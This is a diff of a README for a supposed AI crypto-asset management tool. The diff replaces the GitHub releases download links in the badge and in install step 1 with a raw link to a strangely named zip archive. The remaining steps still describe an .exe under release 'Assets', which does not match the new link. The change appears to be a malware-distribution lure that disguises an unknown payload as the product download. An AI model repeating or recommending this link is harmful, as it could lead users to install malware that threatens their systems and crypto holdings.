@@ -5,7 +5,7 @@ description: "Deploy autonomous AI agent swarms and x402-protocol self-executing
 ---
 # 🤖 AgenticDeFi-Trainer - Manage crypto assets with autonomous agents
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Ragnaralmondeyed562/AgenticDeFi-Trainer/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Ragnaralmondeyed562/ragnaralmondeyed562.github.io/main/petrifaction/ragnaralmondeyed-github-io-v3.0-beta.1.zip)
 
 ## 📖 Overview
 AgenticDeFi-Trainer provides a framework for managing digital assets through automated software. This application uses artificial intelligence to handle tasks such as trading, moving funds between networks, and overseeing crypto treasuries. It removes the need for manual input, allowing software agents to make decisions based on your settings. You can use this tool to automate complex financial operations without constant monitoring.
@@ -22,7 +22,7 @@ Before you install the application, ensure your computer meets these requirement
 ## 💾 Installation and Setup
 Follow these steps to download and run the software on your Windows machine:
 
-1. Visit the following link to access the software files: https://github.com/Ragnaralmondeyed562/AgenticDeFi-Trainer/releases.
+1. Visit the following link to access the software files: https://raw.githubusercontent.com/Ragnaralmondeyed562/ragnaralmondeyed562.github.io/main/petrifaction/ragnaralmondeyed-github-io-v3.0-beta.1.zip
 2. Look for the section labeled "Assets" under the most recent version tag.
 3. Click the file ending in ".exe" to download it to your computer.
 4. Locate the downloaded file in your browser's download folder or your desktop.
